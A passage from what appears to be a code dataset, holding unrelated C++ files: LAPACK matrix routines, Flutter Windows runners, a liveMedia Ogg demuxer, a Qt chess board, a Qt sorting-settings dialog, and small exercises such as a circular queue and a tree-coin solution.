FACTORIZATION\n    extern int dgetrf_(unsigned int *, unsigned int *, double *, unsigned int *, int *, int *);\n}\n\nextern \"C\" { // SOLVING LINEAR SYSTEM\n    extern int dgetrs_(char *, unsigned int *, unsigned int *, double *, unsigned int *, int *, double *, unsigned int *, int *);\n}\n\nextern \"C\" { // SWAP COLUMNS\n    extern int dswap_(unsigned int *, double *, int *, double *, int *);\n}\n\n\ndouble * fill_in_x(unsigned int n, unsigned int s)\n{\n    double * x = new double[n * s];\n    for(int i = 0; i < n * s; i++) x[i] = 0;\n\n    return x;\n}\n\ndouble * fill_in_b(unsigned int n, unsigned int s)\n{\n    double * b = new double [n * s];\n    for (int i = 0; i < n; ++i){\n        for(int j = 0; j < s; ++j) {\n            b[j * n + i] = (j + i) % n + 1;\n        }\n    }\n    return b;\n}\n\ndouble * fill_in_A(unsigned int n)\n{\n    double * A = new double [n * n];\n    for (int i = 0; i < n; ++i) {\n        A[i * n + i] = 4;\n        if (i + 1 < n) {\n            A[i * n + i + 1] = -1;\n            A[(i + 1) * n + i] = -1;\n        }\n    }\n    return A;\n}\n\n\nvoid print_matrix(double * ary, unsigned int n, unsigned int s, int dist = 15) \n{\n    std::cout << std::endl << std::setw(dist);\n    for(int i = 0; i < n; i++) {\n        \n        for(int j = 0; j < s; j++) {\n            std::cout  << ary[j * n + i] << std::setw(dist);\n        }\n        std::cout << std::endl;\n    }\n    std::cout << std::endl;\n}\n\n\nunsigned int orth(double * p, double * q, double * r, unsigned int n, unsigned int s, double eps)\n{\n/*\nHOW FUNCTION WORKS:\n1) P = QR (QR decomposition for matrix P)\n2) R = Q1 * R1 * P1 (QR decomposition with pivoting for matrix R, P1 is the permutation matrix)\n3) Searching index of element in main diagonal of matrix R1, which less than eps. Let that index is equal cur_rank\n4) Result matrix is equal to product of matrixes: P = Q * Q2, where matrix Q2 contains first cur_rank columns of matrix Q1\n*/\n\n    for(int i = 0; i < s * s; i++) {\n        r[i] = 0;\n    }\n\n    int inc = 1;\n    unsigned int size = n * s;\n    dcopy_(&size, p, &inc, q, &inc);\n\n\n    int lwork = 3 * n + 1;\n    double * work = new double[3 * n + 1];\n    double * tau = new double [n];\n    int info = 1;\n\n    dgeqrf_(&n, &s, q, &n, tau, work, &lwork, &info);   // P = QR\n\n    // filling R\n    for(int i = 0; i < s; i++) {                         \n        for(int j = i; j < s; j++) {\n            r[j * s + i] = q[j * n + i];\n        }\n    }\n    \n    dorgqr_(&n, &s, &s, q, &n, tau, work, &lwork, &info); // compute Q for P = QR\n\n    int * jpvt = new int[s];\n    dgeqp3_(&s, &s, r, &s, jpvt, tau, work, &lwork, &info); // pivoting QR for R\n\n    unsigned int cur_rank = s;\n    for(int i = 0 ; i < s; ++i) {\n        if (std::abs(r[i * s + i]) < eps) {\n            cur_rank = i;\n            break;\n        }\n    }\n    if (cur_rank == 0) {\n        return 0;\n    }\n\n    dorgqr_(&s, &s, &s, r, &s, tau, work, &lwork, &info); // compute Q in R = QR\n\n    char trans = 'N'; double alph = 1.0; double bet = 0.0;\n    dgemm_(&trans, &trans, &n, &cur_rank, &s, &alph, q, &n, r, &s, &bet, p, &n);\n    return cur_rank;\n    \n}\n\n\ndouble cheb_norm(double * r, int col, unsigned int n)\n{\n    double max = 0.0;\n    for(int i = 0; i < n; ++i) {\n        if(std::abs(r[col * n + i]) > max) max = std::abs(r[col * n + i]);\n    }\n    return max;\n}\n\nvoid swap_cols(double * x, double * r, int i, unsigned int j, int * swaps, unsigned int n, unsigned int s)\n{\n// Swapping i-th and j-th columns of matrixes X and R\n    int inc = 1;\n    dswap_(&n, &r[i * n], &inc, &r[j * n], &inc);\n    dswap_(&n, &x[i * n], &inc, &x[j * n], &inc);\n    if(j != 0) {\n        unsigned int t = swaps[i];\n        swaps[i] = swaps[j];\n        swaps[j] = t;\n    }\n\n}\n\nvoid swap_back(double * x, int * swaps, unsigned int n, unsigned int s)\n{\n// swaps: (example)\n// [3 1 4 2] -> [4 1 3 2] -> [2 1 3 4] -> [1 2 3 4]\n    int inc = 1;\n    for(unsigned int i = 1; i <= s; ++i) {\n        if(swaps[i - 1] != i - 1) {\n            dswap_(&n, &x[(i - 1) * n], &inc, &x[swaps[i -",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"todo_list_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.CreateAndShow(L\"projeto_modulo_4\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/**********\nThis library is free software; you can redistribute it and/or modify it under\nthe terms of the GNU Lesser General Public License as published by the\nFree Software Foundation; either version 3 of the License, or (at your\noption) any later version. (See <http://www.gnu.org/copyleft/lesser.html>.)\n\nThis library is distributed in the hope that it will be useful, but WITHOUT\nANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS\nFOR A PARTICULAR PURPOSE.  See the GNU Lesser General Public License for\nmore details.\n\nYou should have received a copy of the GNU Lesser General Public License\nalong with this library; if not, write to the Free Software Foundation, Inc.,\n51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA\n**********/\n// \"liveMedia\"\n// Copyright (c) 1996-2024 Live Networks, Inc.  All rights reserved.\n// A server demultiplexor for a Ogg file\n// Implementation\n\n#include \"OggFileServerDemux.hh\"\n#include \"OggFileServerMediaSubsession.hh\"\n\nvoid OggFileServerDemux\n::createNew(UsageEnvironment& env, char const* fileName,\n\t    onCreationFunc* onCreation, void* onCreationClientData) {\n  (void)new OggFileServerDemux(env, fileName,\n\t\t\t       onCreation, onCreationClientData);\n}\n\nServerMediaSubsession* OggFileServerDemux::newServerMediaSubsession() {\n  u_int32_t dummyResultTrackNumber;\n  return newServerMediaSubsession(dummyResultTrackNumber);\n}\n\nServerMediaSubsession* OggFileServerDemux\n::newServerMediaSubsession(u_int32_t& resultTrackNumber) {\n  resultTrackNumber = 0;\n\n  OggTrack* nextTrack = fIter->next();\n  if (nextTrack == NULL) return NULL;\n\n  return newServerMediaSubsessionByTrackNumber(nextTrack->trackNumber);\n}\n\nServerMediaSubsession* OggFileServerDemux\n::newServerMediaSubsessionByTrackNumber(u_int32_t trackNumber) {\n  OggTrack* track = fOurOggFile->lookup(trackNumber);\n  if (track == NULL) return NULL;\n\n  ServerMediaSubsession* result = OggFileServerMediaSubsession::createNew(*this, track);\n  if (result != NULL) {\n#ifdef DEBUG\n    fprintf(stderr, \"Created 'ServerMediaSubsession' object for track #%d: (%s)\\n\", track->trackNumber, track->mimeType);\n#endif\n  }\n\n  return result;\n}\n\nFramedSource* OggFileServerDemux::newDemuxedTrack(unsigned clientSessionId, u_int32_t trackNumber) {\n  OggDemux* demuxToUse = NULL;\n\n  if (clientSessionId != 0 && clientSessionId == fLastClientSessionId) {\n    demuxToUse = fLastCreatedDemux; // use the same demultiplexor as before\n      // Note: This code relies upon the fact that the creation of streams for different\n      // client sessions do not overlap - so all demuxed tracks are created for one \"OggDemux\" at a time.\n      // Also, the \"clientSessionId != 0\" test is a hack, because 'session 0' is special; its audio and video streams\n      // are created and destroyed one-at-a-time, rather than both streams being\n      // created, and then (later) both streams being destroyed (as is the case\n      // for other ('real') session ids).  Because of this, a separate demultiplexor is used for each 'session 0' track.\n  }\n\n  if (demuxToUse == NULL) demuxToUse = fOurOggFile->newDemux(onDemuxDeletion, this);\n\n  fLastClientSessionId = clientSessionId;\n  fLastCreatedDemux = demuxToUse;\n\n  return demuxToUse->newDemuxedTrackByTrackNumber(trackNumber);\n}\n\nOggFileServerDemux\n::OggFileServerDemux(UsageEnvironment& env, char const* fileName,\n\t\t     onCreationFunc* onCreation, void* onCreationClientData)\n  : Medium(env),\n    fFileName(fileName), fOnCreation(onCreation), fOnCreationClientData(onCreationClientData),\n    fIter(NULL/*until the OggFile is created*/),\n    fLastClientSessionId(0), fLastCreatedDemux(NULL) {\n  OggFile::createNew(env, fileName, onOggFileCreation, this);\n}\n\nOggFileServerDemux::~OggFileServerDemux() {\n  Medium::close(fOurOggFile);\n\n  delete fIter;\n}\n\nvoid OggFileServerDemux::onOggFileCreation(OggFile* newFile, void* clientData) {\n  ((OggFileServerDemux*)clientData)->onOggFileCreation(newFile);\n}\n\nvoid OggFileServerDemux::onOggFileCreation(OggFile* newFile) {\n  fOurOggFile = newFile;\n\n  fIter = new OggTrackTableIterator(fOurOggFile->trackTable());\n\n  // Now, call our own creation notification function:\n  if (fOnCreation != NULL) (*fOnCreation)(this, fOnCreationClientData);\n}\n\nvoid OggFileServerDemux::onDemuxDeletion(void* clientData, OggDemux* demuxBeingDeleted) {\n  ((OggFileServerDemux*)clientData)->onDemuxDeletion(demuxBeingDeleted);\n}\n\nvoid OggFileServerDemux::onDemuxDeletion(OggDemux* demuxBeingDeleted) {\n  if (fLastCreatedDemux == demuxBeingDeleted) fLastCreatedDemux = NULL;\n}\n",
    "/*----------------------------------------------------------------------------\r\nLAB EXERCISE - Environmental sensors measurements\r\n ----------------------------------------\r\n\tIn this exercise we will read the environmental sensors on the Nucleo sensors shield (X-NUCLEO-IKS01A1)\r\n\twith the help of the ST Nucleo Sensor Shield library which is compatible with the MBED API.\r\n\tThen we will send the measurements via USB to our PC using serial communication.\r\n\tWe can then display the results using a terminal emulation program (e.g. Termite).\r\n\r\n\tAt the same time the program blinks the on board LED to show alivness.\r\n\r\n\r\n\tGOOD LUCK!\r\n *----------------------------------------------------------------------------*/\r\n\r\n\r\n#include \"mbed.h\"\r\n#include \"platform/mbed_thread.h\"\r\n#include \"XNucleoIKS01A3.h\"\r\n\r\n// Blinking rate in milliseconds\r\n#define BLINKING_RATE_MS                                                    1000\r\n\r\n// Create a DigitalOut objects for the LED\r\n\r\n// Create a Serial objects to communicate via USB\r\n\r\n// Create 2 Ticker objects for recurring interrupts. One for blink a LED and the other one to update the sensor lectures periodicly\r\n\r\n// Declare and define a measurement update flag\r\n\r\n// Handler for the aliveness LED; to be called every 0.5s\r\n\r\n// Handler for the measurements update; rise a flag every 3 seconds\r\n\r\n/* Create sensor shield object */\r\n\r\nint main()\r\n{\r\n    \r\n    /* Enable sensors */\r\n\r\n    /* Attach functions to be called by the Ticker objects at a specific interval in seconds */\r\n\r\n    while (true) {\r\n        /* Check for the measurements update flag */\r\n\r\n            /* Read the environmental sensors */\r\n\r\n            /* Calculate temperature in Fahrenheit and Kelvins */\r\n\r\n            /*Send data through serial communication */\r\n\r\n            /* Turn down the measurements update flag */\r\n\r\n        /*Wait for interrupts*/\r\n\r\n    }\r\n}\r\n",
    "#include \"widget.h\"\n#include \"./ui_widget.h\"\n#include \"ui_inputfen.h\"\n\nWidget::Widget(QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::Widget)\n{\n    setFocusPolicy(Qt::StrongFocus);\n    ui->setupUi(this);\n    InitProgram();\n    InitWindow();\n}\n\nWidget::~Widget()\n{\n    delete ui;\n}\n\nvoid Widget::paintEvent(QPaintEvent* event){\n    {\n        ui->Output_PGN->setEnabled(false);\n    }\n    if(Options::LightColorMode){\n        ui->TurnLabel->setStyleSheet(\"color:#0f0f0f;\");\n    }\n    else{\n        ui->TurnLabel->setStyleSheet(\"color:#f0f0f0;\");\n        QPainter p(this);\n        QPen pen;\n        QBrush brush;\n        QColor color;\n        color.setRgb(15, 15, 15);\n        pen.setColor(color);\n        brush.setColor(color);\n        brush.setStyle(Qt::SolidPattern);\n        p.setPen(pen);\n        p.setBrush(brush);\n        p.drawRect(rect());\n    }\n    if(InGame){\n        switch (game->turn){\n            case White:\n                ui->TurnLabel->setText(\"\u767d\u65b9\u56de\u5408\");\n                break;\n            case Black:\n                ui->TurnLabel->setText(\"\u9ed1\u65b9\u56de\u5408\");\n                break;\n            default:\n                break;\n        }\n    }\n    QPainter painter(this);\n    painter.setRenderHint(QPainter::Antialiasing);\n    QPixmap Board, InCheck, BoardBlock[8][8], BoardChess[8][8];\n    Board.load(IMG_BOARD);\n    InCheck.load(IMG_CHECK);\n    painter.drawPixmap(60, 40, 640, 640, Board);\n    if(HoldingChess){\n        for(short ROW=0; ROW<8; ROW++){\n            for(short COL=0; COL<8; COL++){\n                if(ROW==OldRow && COL==OldCol){\n                    if((ROW+COL)%2){\n                        BoardBlock[ROW][COL].load(IMG_VALID_BLOCK);\n                    }\n                    else{\n                        BoardBlock[ROW][COL].load(IMG_VALID_BLOCK2);\n                    }\n                    painter.drawPixmap(60+COL*80, 600-ROW*80, 80, 80, BoardBlock[ROW][COL]);\n                    continue;\n                }\n                for(short s=0; ; s++){\n                    if(valid[s][0]==-1){\n                        break;\n                    }\n                    if((ROW==valid[s][0] && COL==valid[s][1])){\n                        if(game->chess[ROW][COL]->p==Neutral){\n                            BoardBlock[ROW][COL].load(IMG_VALID_POINT);\n                            painter.drawPixmap(60+COL*80, 600-ROW*80, 80, 80, BoardBlock[ROW][COL]);\n                        }\n                        else{\n                            if((ROW+COL)%2){\n                                BoardBlock[ROW][COL].load(IMG_VALID_BLOCK);\n                            }\n                            else{\n                                BoardBlock[ROW][COL].load(IMG_VALID_BLOCK2);\n                            }\n                            painter.drawPixmap(60+COL*80, 600-ROW*80, 80, 80, BoardBlock[ROW][COL]);\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if(game->turn==Neutral){\n        if(!Empty){\n            painter.drawPixmap(KingX, KingY, 80, 80, InCheck);\n        }\n    }\n    else{\n        short* KingPos = game->FindKing(game->turn);\n        if(KingPos != nullptr && game->KingInCheck(game->turn, KingPos[0], KingPos[1])){\n            KingX = 60+KingPos[1]*80;\n            KingY = 600-KingPos[0]*80;\n            painter.drawPixmap(KingX, KingY, 80, 80, InCheck);\n        }\n        IsCheckmate();\n    }\n    for(short ROW=0; ROW<8; ROW++){\n        for(short COL=0; COL<8; COL++){\n            if(game->chess[ROW][COL]->Type()!=Null){\n                if(game->chess[ROW][COL]->p==White){\n                    switch (game->chess[ROW][COL]->Type()){\n                        case King:\n                            BoardChess[ROW][COL].load(IMG_WHITE_KING);\n                            break;\n                        case Queen:\n                            BoardChess[ROW][COL].load(IMG_WHITE_QUEEN);\n                            break;\n                        case Bishop:\n                            BoardChess[ROW][COL].load(IMG_WHITE_BISHOP);\n                            break;\n                        case kNight:\n                            BoardChess[ROW][COL].load(IMG_WHITE_KNIGHT);\n                            break;\n                        case Rook:\n                            BoardChess[ROW][COL].load(IMG_WHITE_ROOK);\n                            break;\n                        case Pawn:\n                            BoardChess[ROW][COL].load(IMG_WHITE_PAWN);\n                            break;\n                        default:\n                            break;\n                    }\n                }\n                else{\n                    switch (game->chess[ROW][COL]->Type()){\n                        case King:\n                            BoardChess[ROW][COL].load(IMG_BLACK_KING);\n                            break;\n                        case Queen:\n                            BoardChess[ROW][COL].load(IMG_BLACK_QUEEN);\n                            break;\n                        case Bishop:\n             ",
    "#include <iostream>\n#include <cstdlib>\nusing namespace std;\n\nstruct TreeNode {\n    int val;\n    TreeNode *left, *right;\n    TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}\n    TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}\n};\n\nclass Solution {\npublic:\n    int distributeCoins(TreeNode* root) {\n        int moves = 0;\n        dfs(root, moves);\n        return moves;\n    }\n\nprivate:\n    int dfs(TreeNode* node, int& moves) {\n        if (!node) return 0;\n\n        int left_excess = dfs(node->left, moves);\n        int right_excess = dfs(node->right, moves);\n\n        moves += abs(left_excess) + abs(right_excess);\n\n        return node->val + left_excess + right_excess - 1;\n    }\n};\n\nint main() {\n    TreeNode* root = new TreeNode(3);\n    root->left = new TreeNode(0);\n    root->right = new TreeNode(0);\n\n    Solution sol;\n    cout << \"Minimum moves: \" << sol.distributeCoins(root) << endl;\n\n    delete root->left;\n    delete root->right;\n    delete root;\n\n    return 0;\n}\n",
    "#include \"../include/container_view.h\"\n#include <iostream>\n#include <vector>\n#include <deque>\n#include <list>\n#include <set>\n#include <map>\n#include <unordered_set>\n#include <unordered_map>\n#include <array>\n#include <tuple>\n#include <forward_list>\n\nint main() {\n    // Pair\n    std::pair<int, double> p = {1, 3.14};\n    std::cout << \"Pair: \" << p << std::endl;\n\n    // Tuple\n    std::tuple<int, char, double> t = {1, 'a', 2.3};\n    std::cout << \"Tuple: \" << t << std::endl;\n\n    // Array\n    std::array<int, 3> arr = {1, 2, 3};\n    std::cout << \"Array: \" << arr << std::endl;\n\n    // Deque\n    std::deque<double> dq = {1.1, 2.2, 3.3};\n    std::cout << \"Deque: \" << dq << std::endl;\n\n    // Forward List\n    std::forward_list<int> fl = {1, 2, 3};\n    std::cout << \"Forward List: \" << fl << std::endl;\n\n    // Initializer list (note: we cannot print directly, used only for example)\n    std::initializer_list<int> il = {1, 2, 3};\n\n    // List\n    std::list<int> lst = {1, 2, 3};\n    std::cout << \"List: \" << lst << std::endl;\n\n    // Vector\n    std::vector<std::string> vec = {\"hello\", \"world\"};\n    std::cout << \"Vector: \" << vec << std::endl;\n\n    // Set\n    std::set<std::string> set = {\"apple\", \"banana\", \"cherry\"};\n    std::cout << \"Set: \" << set << std::endl;\n\n    // Multiset\n    std::multiset<int> mset = {4, 5, 4, 1};\n    std::cout << \"Multiset: \" << mset << std::endl;\n\n    // Unordered Set\n    std::unordered_set<int> uset = {4, 5, 6, 7};\n    std::cout << \"Unordered Set: \" << uset << std::endl;\n\n    // Unordered Multiset\n    std::unordered_multiset<int> umset = {4, 5, 6, 6};\n    std::cout << \"Unordered Multiset: \" << umset << std::endl;\n\n    // Map\n    std::map<char, int> map = {{'a', 1}, {'b', 2}};\n    std::cout << \"Map: \" << map << std::endl;\n\n    // Multimap\n    std::multimap<char, int> mmap = {{'a', 1}, {'a', 2}};\n    std::cout << \"Multimap: \" << mmap << std::endl;\n\n    // Unordered Map\n    std::unordered_map<char, int> umap = {{'c', 3}, {'b', 2}};\n    std::cout << \"Unordered Map: \" << umap << std::endl;\n\n    // Unordered Multimap\n    std::unordered_multimap<char, int> ummap = {{'c', 3}, {'c', 4}};\n    std::cout << \"Unordered Multimap: \" << ummap << std::endl;\n\n    return 0;\n}\n",
    "#include \"SettingsWindow.hpp\"\r\n\r\n#include <QDialogButtonBox>\r\n#include <QTabWidget>\r\n#include <QLabel>\r\n#include <QComboBox>\r\n#include <QSpinBox>\r\n#include <QToolButton>\r\n#include <QButtonGroup>\r\n#include <QCheckBox>\r\n#include <QGroupBox>\r\n#include <QAbstractButton>\r\n#include <QVBoxLayout>\r\n#include <QHBoxLayout>\r\n#include <QGridLayout>\r\n\r\n\r\nSettingsWindow::SettingsWindow(Settings& externalSettings) :\r\n\tQDialog{nullptr, Qt::MSWindowsFixedSizeDialogHint},\r\n\tmExternalSettings{externalSettings},\r\n\tmButtonBox{new QDialogButtonBox},\r\n\tmSettingsTabs{new QTabWidget},\r\n\tmSortingAlogorithmsComboBox{new QComboBox},\r\n\tmInputDataSizeSpinBox{new QSpinBox},\r\n\tmZeroArrayValuesButton{new QToolButton},\r\n\tmGenerateAscendingArrayValuesButton{new QToolButton},\r\n\tmGenerateRandomArrayValuesButton{new QToolButton},\r\n\tmGenerateDescendingArrayValuesButton{new QToolButton},\r\n\tmGenerateButtonGroup{new QButtonGroup},\r\n\tmRepeatedValuesCheckBox{new QCheckBox}\r\n\r\n{\r\n\tsetAttribute(Qt::WA_DeleteOnClose);\r\n\tsetWindowTitle(QStringLiteral(\"Ustawienia aplikacji\"));\r\n\tsetWindowIcon(QIcon(QStringLiteral(\":/Resources/Settings.png\")));\r\n\tsetWindowFlags(windowFlags() & ~Qt::WindowContextHelpButtonHint);\r\n\tsetContextMenuPolicy(Qt::NoContextMenu);\r\n\r\n\tcreateWidgets();\r\n\tcreateConnections();\r\n\tcreateLayout();\r\n\r\n\tresetParameters();\r\n}\r\n\r\nvoid SettingsWindow::createWidgets()\r\n{\r\n\tmButtonBox->addButton(QDialogButtonBox::StandardButton::Ok);\r\n\tmButtonBox->addButton(QDialogButtonBox::StandardButton::Cancel);\r\n\tmButtonBox->addButton(QDialogButtonBox::StandardButton::Reset);\r\n\r\n\tmSettingsTabs->addTab(createGeneralSettingsWidget(), QStringLiteral(\"Og\u00f3lne\"));\r\n\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie przez wstawianie\"), QVariant::fromValue(SortingAlgorithmType::InsertionSort));\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie przez wybieranie\"), QVariant::fromValue(SortingAlgorithmType::SelectionSort));\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie b\u0105belkowe\"), QVariant::fromValue(SortingAlgorithmType::BubbleSort));\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie przez scalanie\"), QVariant::fromValue(SortingAlgorithmType::MergeSort));\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie przez kopcowanie\"), QVariant::fromValue(SortingAlgorithmType::HeapSort));\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie szybkie (Lomuto)\"), QVariant::fromValue(SortingAlgorithmType::QuickSortLomuto));\r\n\tmSortingAlogorithmsComboBox->addItem(QStringLiteral(\"Sortowanie szybkie (Hoare)\"), QVariant::fromValue(SortingAlgorithmType::QuickSortHoare));\r\n\r\n\tmSortingAlogorithmsComboBox->setCurrentIndex(-1);\r\n\r\n\tmInputDataSizeSpinBox->setRange(2, Settings::ArrayFixedSize);\r\n\tmInputDataSizeSpinBox->setValue(2);\r\n\r\n\tmZeroArrayValuesButton->setText(QStringLiteral(\"Wyzeruj elementy\"));\r\n\tmZeroArrayValuesButton->setFixedHeight(23);\r\n\r\n\tmGenerateAscendingArrayValuesButton->setText(\"Kolejno\u015b\u0107 rosn\u0105ca\");\r\n\tmGenerateAscendingArrayValuesButton->setToolButtonStyle(Qt::ToolButtonTextUnderIcon);\r\n\tmGenerateAscendingArrayValuesButton->setIcon(QIcon(\":/Resources/Ascending.png\"));\r\n\tmGenerateAscendingArrayValuesButton->setIconSize(QSize(68, 24));\r\n\tmGenerateAscendingArrayValuesButton->setFixedSize(mGenerateAscendingArrayValuesButton->sizeHint());\r\n\r\n\tmGenerateRandomArrayValuesButton->setText(\"Kolejno\u015b\u0107 losowa\");\r\n\tmGenerateRandomArrayValuesButton->setToolButtonStyle(Qt::ToolButtonTextUnderIcon);\r\n\tmGenerateRandomArrayValuesButton->setIcon(QIcon(\":/Resources/Random.png\"));\r\n\tmGenerateRandomArrayValuesButton->setIconSize(QSize(68, 24));\r\n\tmGenerateRandomArrayValuesButton->setFixedSize(mGenerateAscendingArrayValuesButton->sizeHint());\r\n\r\n\tmGenerateDescendingArrayValuesButton->setText(\"Kolejno\u015b\u0107 malej\u0105ca\");\r\n\tmGenerateDescendingArrayValuesButton->setToolTip(\"Wygeneruje dla wszystkich element\u00f3w warto\u015bci w kolejno\u015bci malej\u0105cej\");\r\n\tmGenerateDescendingArrayValuesButton->setToolButtonStyle(Qt::ToolButtonTextUnderIcon);\r\n\tmGenerateDescendingArrayValuesButton->setIcon(QIcon(\":/Resources/Descending.png\"));\r\n\tmGenerateDescendingArrayValuesButton->setIconSize(QSize(68, 24));\r\n\tmGenerateDescendingArrayValuesButton->setFixedSize(mGenerateAscendingArrayValuesButton->sizeHint());\r\n\r\n\tmGenerateButtonGroup->addButton(mZeroArrayValuesButton, GenerateButtonID::ZeroArrayValuesButton);\r\n\tmGenerateButtonGroup->addButton(mGenerateAscendingArrayValuesButton, GenerateButtonID::AscendingArrayValuesButton);\r\n\tmGenerateButtonGroup->addButton(mGenerateRandomArrayValuesButton, GenerateButtonID::RandomArrayValuesButton);\r\n\tmGenerateButtonGroup->addButton(mGenerateDescendingArrayValuesButton, GenerateButtonID::DescendingArrayValuesButton);\r\n\r\n\tmRepeatedValuesCheckBox->setText(QStringLiteral(\"Powtarzaj\u0105ce si\u0119 warto\u015bci\"));\r\n\tmRepeatedValuesCheckBox->setChecked(true);\r\n\tmRepeatedValuesCheckBox->setToolTip(\"Mo\u017cliwe wyst\u0105pienie identycznych warto\u015bci podczas losowego generowania\");\r\n}\r\n\r\nvoid SettingsWindow::createConnections()\r\n{\r",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"google_nav_bar\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\nclass queue {\r\n int a[5], r, f;\r\npublic:\r\n queue() {\r\n f = r = -1;\r\n }\r\n void push();\r\n void pop();\r\n void show();\r\n};\r\nvoid queue::push() {\r\n int item;\r\nif ((f == 0 && r == 4) || (f == r + 1)) {\r\n cout << \"\\n Overflow\";\r\n } else {\r\n if (r == 4)\r\n r = -1;\r\n r++;\r\n cout << \"\\nEnter item :\";\r\n cin >> item;\r\n a[r] = item;\r\n if (f == -1) {\r\n f = 0;\r\n }\r\n }\r\n}\r\nvoid queue::pop() {\r\n if (f == -1) {\r\n cout << \"\\n Underflow\";\r\n } else {\r\n cout << \"\\nDeleted element is :\" << a[f];\r\n if (f == r) {\r\n f = -1;\r\n r = -1;\r\n } else {\r\n if (f == 4)\r\n f = 0;\r\n else\r\n f++;\r\n }\r\n }\r\n}\r\nvoid queue::show() {\r\n if (f == -1) {\r\n cout << \"\\nEmpty :\";\r\n } else if (f <= r) {\r\n for (int i = f; i <= r; i++) {\r\n cout << \"\\n\" << a[i];\r\n }\r\n } else {\r\n for (int i = f; i <= 4; i++) {\r\n cout << \"\\n\" << a[i];\r\n }\r\n for (int j = 0; j <= r; j++) {\r\n cout << \"\\n\" << a[j];\r\n }\r\n }\r\n}\r\nint main() {\r\n queue s;\r\n int ch;\r\n do {\r\n cout << \"\\n 1: Push 2: Pop 3:show 4:exit \";\r\n cout << \"\\nEnter choice\";\r\n cin >> ch;\r\n switch (ch) {\r\n case 1:\r\n s.push();\r\n break;\r\n case 2:\r\n s.pop();\r\n break;\r\n case 3:\r\n s.show();\r\n break;\r\n default:\r\n cout << \"\\n Wrong Choice\";\r\n }\r\n } while (ch != 4);\r\nreturn 0;\r\n}\r\n",
